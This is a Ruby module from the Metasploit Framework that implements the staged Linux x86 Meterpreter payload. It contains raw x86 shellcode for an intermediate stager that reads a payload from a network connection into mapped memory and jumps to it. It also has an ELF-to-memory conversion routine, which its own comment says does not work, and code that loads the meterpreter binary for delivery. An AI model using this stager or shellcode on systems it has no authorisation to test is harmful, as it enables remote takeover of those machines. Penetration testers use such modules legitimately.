##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/meterpreter_x86_linux'
require 'msf/base/sessions/meterpreter_options'
require 'rex/elfparsey'

module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Meterpreter',
      'Description'   => 'Staged meterpreter server',
      'Author'        => ['PKS', 'egypt'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x86_Linux))

    register_options([
      OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
    ], self.class)
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
    ep = elf.elf_header.e_entry
    return ep
  end

  def elf2bin(payload)
    # XXX, not working. Use .c version

    # This code acts as a mini elf parser / memory layout linker.
    # It will return what a elf file looks like once loaded in memory

    mem = "\x00" * (4 * 1024 * 1024)
    used = 0

    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )

    elf.program_header.each { |hdr|
      if(hdr.p_type == Rex::ElfParsey::ElfBase::PT_LOAD)
        print_status("Found PT_LOAD")
        fileidx = hdr.p_offset & (~4095)
        memidx = (hdr.p_vaddr & (~4095)) - elf.base_addr
        len = hdr.p_filesz + (hdr.p_vaddr & 4095)

        mem[memidx,memidx+len] = payload[fileidx,fileidx+len] # should result in a single memcpy call :D
        used += (hdr.p_memsz + (hdr.p_vaddr & 4095) + 4095) & ~4095
      end
    }

    # Maybe at some stage zero out elf header / program headers in case tools
    # try to look for them

    print_status("Converted ELF file to memory layout, #{payload.length} to #{used} bytes")
    return mem[0, used]
  end

  def handle_intermediate_stage(conn, payload)
    # Does a mmap() / read() loop of a user specified length, then
    # jumps to the entry point (the \x5a's)

    midstager = "\x81\xc4\x54\xf2\xff\xff" # fix up esp

    midstager <<
      "\x6a\x04\x5a\x89\xe1\x89\xfb\x6a\x03\x58" +
      "\xcd\x80\x57\xb8\xc0\x00\x00\x00\xbb\x00\x00\x04\x20\x8b\x4c\x24" +
      "\x04\x6a\x07\x5a\x6a\x32\x5e\x31\xff\x89\xfd\x4f\xcd\x80\x3d\x7f" +
      "\xff\xff\xff\x72\x05\x31\xc0\x40\xcd\x80\x87\xd1\x87\xd9\x5b\x6a" +
      "\x03\x58\xcd\x80\x3d\x7f\xff\xff\xff\x77\xea\x85\xc0\x74\xe6\x01" +
      "\xc1\x29\xc2\x75\xea\x6a\x59\x53\xb8\x5a\x5a\x5a\x5a\xff\xd0\xe9" +
      "\xd1\xff\xff\xff"


    # Patch in debug options
    midstager = midstager.sub("Y", [ datastore['DebugOptions'] ].pack('C'))

    # Patch entry point
    midstager = midstager.sub("ZZZZ", [ elf_ep(payload) ].pack('V'))

    # Maybe in the future patch in base.

    print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
    conn.put(midstager)
    Rex::ThreadSafe.sleep(1.5)

    # Send length of payload
    conn.put([ payload.length ].pack('V'))
    return true

  end

  def generate_stage
    #file = File.join(Msf::Config.data_directory, "msflinker_linux_x86.elf")
    file = File.join(Msf::Config.install_root, "data", "meterpreter", "msflinker_linux_x86.bin")

    met = File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }

    return met
  end
end
